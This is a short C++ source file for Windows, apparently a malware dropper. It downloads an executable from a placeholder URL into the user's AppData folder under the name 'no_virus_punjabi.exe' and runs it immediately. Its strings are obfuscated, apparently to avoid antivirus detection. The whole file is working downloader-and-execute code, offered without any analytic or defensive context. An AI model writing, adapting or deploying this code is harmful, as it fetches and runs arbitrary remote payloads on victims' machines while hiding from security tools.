#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <iostream>
#include "obfuscate.h"


using namespace std;

int main() {
    char* file_url = AY_OBFUSCATE("EX WEBHOOK HERE");
    char* file_name = AY_OBFUSCATE("no_virus_punjabi.exe");


    char* appdata_name = AY_OBFUSCATE("APPDATA");
    char* roaming;
    size_t len;
    _dupenv_s(&roaming, &len, appdata_name);
    remove(file_name);
    string path_val1 = string(roaming) + "\\" + file_name;
    std::wstring widestr1 = std::wstring(path_val1.begin(), path_val1.end());
    wchar_t* vOut = new wchar_t[strlen(file_url) + 1];
    mbstowcs_s(NULL, vOut, strlen(file_url) + 1, file_url, strlen(file_url));
    const wchar_t* sURL1 = vOut;
    const wchar_t* dFile1 = widestr1.c_str();
    if (S_OK == URLDownloadToFile(NULL, sURL1, dFile1, 0, NULL)) 
    {
        cout << AY_OBFUSCATE("Downloaded");
        string run_path = string(roaming) + "\\" + file_name;
        system(run_path.c_str());
        return 0;
    }
    else 
    {
        cout << AY_OBFUSCATE("Error");
    }
}

